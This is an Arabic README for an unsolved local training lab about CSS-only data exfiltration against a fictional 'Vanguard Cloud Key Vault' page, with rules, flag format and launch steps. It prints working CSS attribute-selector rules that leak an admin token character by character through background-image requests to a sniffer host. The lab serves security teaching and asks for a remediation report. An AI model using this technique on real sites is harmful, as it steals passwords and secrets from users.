# المختبر 2: تحدي تدريبي غير محلول — تسريب البيانات عبر محددات CSS

> 🌐 **Language:** [English (README.md)](./README.md) | **العربية 🇸🇦**

---

## 🎯 ملخص المهمة والتحدي

**الهدف المستهدف:** تطبيق Vanguard Cloud Key Vault  
**بيئة الفحص:** بيئة خالية من الجافا سكريبت ومحمية بسياسة CSP صارمة (`script-src 'none'`).  
**مهمتك كمدقق أمني:** تسمح بوابة الدعم الفني للمستخدمين بحقن أكواد CSS مخصصة لتغيير سمات الواجهة. ويوجد حقل إدخال لكلمة مرور إدارية في نفس الصفحة. مهمتك هي استخدام **محددات خصائص CSS فقط** لاستخراج كلمة المرور الإدارية السرية حرفاً بحرف دون تشغيل أي كود جافا سكريبت!

---

## 🕵️ شروط وقواعد الاختبار

1. **ممنوع استخدام جافا سكريبت:** لا تحاول كسر الـ CSP أو إدراج وسوم `<script>`. يجب أن يكون استخراج البيانات كاملاً عبر قواعد CSS في حقل حقن التنسيق.
2. **صيغة الراية (Flag):** يبدأ الرمز السري دائماً بالصيغة: `FLAG{...}`.
3. **مخرج التحدي:** بمجرد نجاحك في استخراج الرمز كاملاً، وثق منهجية عملك، دليل الإثبات (PoC)، وخطوات الترقيع في ملف `REPORT_TEMPLATE.md`.

---

## 💡 منهجية وتلميحات الاستغلال

1. **استخدام محددات البادئة (`^=`):**
   ```css
   input[name="admin_token"][value^="FLAG{A"] {
       background-image: url("http://sniffer.local/leak?char=A");
   }
   input[name="admin_token"][value^="FLAG{B"] {
       background-image: url("http://sniffer.local/leak?char=B");
   }
   input[name="admin_token"][value^="FLAG{C"] {
       background-image: url("http://sniffer.local/leak?char=C");
   }
   ```
2. عندما يطابق المتصفح قيمة الحقل مع الحرف الصحيح، يطلب صورة الخلفية تلقائياً ويطلق طلباً إلى رابط الـ sniffer.
3. راقب شاشة الراصد (Sniffer Console)، وسجل الحرف الصحيح، ثم أضف الحرف التالي إلى قاعدة الاستعلام!

---

## 🚀 كيفية تشغيل التحدي محلياً

افتح ملف `index.html` في المتصفح:
```powershell
Start-Process chrome.exe "E:\Programming Languages\02-HTML-CSS\Level-3-Advanced-and-Security\Labs\Lab-2-Challenge-Unsolved\index.html"
```

بعد الوصول إلى الراية واستخراجها، املأ **[تقرير الفحص الأمني REPORT_TEMPLATE.md](./REPORT_TEMPLATE.md)** بالنتائج وتوصيات الإصلاح.
